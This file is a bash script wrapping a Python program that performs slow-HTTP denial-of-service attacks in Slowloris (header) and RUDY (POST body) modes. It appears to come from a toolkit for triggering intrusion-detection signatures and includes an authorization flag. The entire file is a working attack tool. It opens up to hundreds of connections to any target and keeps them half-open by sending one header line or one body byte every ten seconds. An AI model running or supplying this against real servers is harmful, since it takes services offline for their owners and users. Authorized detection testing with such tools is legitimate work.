#!/usr/bin/env bash
# slowloris.sh - slow-HTTP denial of service (Python sockets, no root).
# Needs: python3.
# Triggers: headers sid 1000030 (Slowloris, slow HTTP headers),
#           body    sid 1000032 (Slow HTTP POST, R-U-Dead-Yet).
. "$(cd "$(dirname "$0")" && pwd)/_lib.sh"

usage() { cat <<U
Usage: $PROG --i-have-authorization -t TARGET [-p PORT] [-m headers|body] [-n SOCKETS] [-s SECONDS]
  -p PORT      HTTP port (default 80)
  -m MODE      headers (slowloris, default) or body (RUDY)
  -n SOCKETS   concurrent connections (default 200)
  -s SECONDS   how long to hold them open (default 120)
U
}

TARGET=""; PORT=80; MODE=headers; SOCKS=200; SECS=120
while [ $# -gt 0 ]; do
  case $1 in
    --i-have-authorization) AUTHORIZED=1 ;;
    -t|--target) TARGET=${2:?}; shift ;;
    -p|--port) PORT=${2:?}; shift ;;
    -m|--mode) MODE=${2:?}; shift ;;
    -n|--sockets) SOCKS=${2:?}; shift ;;
    -s|--seconds) SECS=${2:?}; shift ;;
    -h|--help) usage; exit 0 ;;
    *) die "unknown argument: $1 (see --help)" ;;
  esac
  shift
done

need_tool python3
authorize "$TARGET"
export TARGET PORT MODE SOCKS SECS
exec python3 - <<'PY'
import os, socket, time, random
t = os.environ["TARGET"]; p = int(os.environ["PORT"]); mode = os.environ["MODE"]
n = int(os.environ["SOCKS"]); secs = int(os.environ["SECS"])
socks = []
for i in range(n):
    try:
        s = socket.create_connection((t, p), timeout=4)
        if mode == "body":
            s.sendall(b"POST /upload HTTP/1.1\r\nHost: %b\r\nContent-Length: 1000000\r\n\r\n" % t.encode())
        else:
            s.sendall(b"GET /?%d HTTP/1.1\r\nHost: %b\r\n" % (i, t.encode()))
        socks.append(s)
    except OSError:
        pass
print(f"{mode}: opened {len(socks)}/{n} sockets to {t}:{p}, dribbling for {secs}s (Ctrl-C to stop)")
end = time.time() + secs
try:
    while time.time() < end and socks:
        for s in list(socks):
            try:
                if mode == "body":
                    s.sendall(b"%d" % random.randint(0, 9))          # one body byte
                else:
                    s.sendall(b"X-a%d: b\r\n" % random.randint(0, 99999))  # one more header
            except OSError:
                socks.remove(s)
        time.sleep(10)
finally:
    for s in socks:
        s.close()
PY
